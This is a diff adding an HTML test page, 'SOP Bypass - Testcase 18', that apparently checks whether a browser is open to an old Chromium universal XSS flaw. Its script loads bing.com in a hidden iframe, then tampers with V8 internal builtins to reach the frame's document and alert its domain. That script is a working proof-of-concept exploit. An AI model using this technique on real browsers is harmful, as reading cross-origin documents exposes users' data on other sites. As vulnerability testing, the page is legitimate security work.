@@ -1,0 +1,108 @@
+<html>
+	<head>
+		<title>Universal XSS (UXSS) SOP Bypass Vulnerability test</title>
+		<style type="text/css">
+			*{margin:0;padding:0;}
+			.wrapper {
+				width: 95%;
+				background-color: #16a085;
+				margin: 0 auto;
+				font-family: times new roman;
+				height: 88%;
+			}
+			.line {
+				background-color: #ecf0f1;
+				text-align: center;
+				padding: 10px;
+				color: #16a085;;
+			}
+			.main {
+				color: #fff;
+				padding: 10px;
+			}
+			.test {
+				width: 200px;
+				height: 40px;
+				background-color: #fff;
+				border: none;
+				border-radius: 100px;	
+				color: #16a085;
+				font-size: 1.6em;
+				margin: 0 auto;
+			}
+			.note {
+				background: #1abc9c;
+				color: #fff;
+				padding: 10px;
+				width: 95%;
+				margin: 0 auto;
+				margin-top: 40px;
+			}
+		</style>
+	</head>
+<body>
+
+
+	<div class="wrapper">
+			<img src="and.png">
+	
+			<h3 class="line">SOP Bypass - Testcase 18</h3>	
+
+		<div class="main">
+				<p>Based upon Chromium uxss (2012)</p>
+		</div>
+<script> 
+
+
+function myfunction()
+{
+  frame = document.body.appendChild(document.createElement("iframe"));
+frame.src = "http://www.bing.com/";
+frame.width= '0'
+
+frame.onload = function() {
+        Function("}, (builtins = this), function() {");
+        originalInstantiate = builtins.Instantiate;
+        builtins.DefineOneShotAccessor(builtins, "Instantiate", function() {});
+        flag = 0;
+        template = null;
+        builtins.Instantiate = function(x, y) {
+                if (flag) {
+                        doc = frame.contentWindow.document;
+                        alert(doc.domain);
+                        flag = 0;
+                } else if (!template)
+                        template = x;
+
+                return originalInstantiate(x, y);
+        };
+        document.implementation;
+        flag = 1;
+        builtins.ConfigureTemplateInstance(frame.contentWindow, template);
+}
+	  }
+
+ 
+ 
+</script>
+		
+		<center>	<input type="button" id="btn_test" class="test" value="Run Test Case" onclick="myfunction()" /></center>
+
+		
+
+
+ 
+ 
+
+		</br></br>
+			<div class="note">
+		
+				<p><strong>Note:</strong> <br />
+					If page displays an alert box where document.domain property is poiting to bing.com, your browser is vulnerable to SOP bypass "
+				</p>
+			</div>
+	</div>
+
+
+</body>
+</html>
